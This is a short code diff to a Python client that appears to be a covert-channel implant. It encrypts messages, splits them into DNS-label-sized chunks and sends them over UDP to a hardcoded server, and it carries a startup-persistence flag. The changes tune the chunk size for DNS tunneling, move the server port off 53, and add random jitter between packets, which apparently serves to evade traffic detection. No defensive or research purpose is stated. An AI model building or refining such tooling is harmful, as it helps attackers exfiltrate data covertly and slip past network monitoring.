@@ -14,9 +14,9 @@ MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
 byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 -----END PUBLIC KEY-----"""
 target_pub_key = None
-CHUNK_SIZE = 36 # تم التعديل ليتناسب مع CVC (30 data + 6 header)
+CHUNK_SIZE = 23 # 19 data + 4 header -> 3 labels of 21 chars -> 5 total labels
 IS_ADDED_TO_STARTUP = False
-SERVER = ("192.168.1.35", 53)
+SERVER = ("192.168.1.35", 27381)
 sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 last_received_time = None
@@ -58,7 +58,7 @@ def send_msg(message, is_cached: bool):
         else:
             return
         
-        chunks = dns_message(encrypted_bytes, 36)
+        chunks = dns_message(encrypted_bytes, CHUNK_SIZE)
         print(f"[SEND_MSG DEBUG] Got {len(chunks)} chunks to send")
 
         sent_chunks = {}
@@ -67,7 +67,8 @@ def send_msg(message, is_cached: bool):
             if is_cached:
                 sent_chunks[i] = chunk
             print(f"[SEND_MSG DEBUG] Sending chunk {i}")
-            time.sleep(0.01)  # 10ms between packets
+            jitter_delay = 0.003 + random.uniform(-0.001, 0.001)
+            time.sleep(jitter_delay)  # 10ms between packets
             sock.sendto(chunk, SERVER)
             i += 1
     except Exception as e:
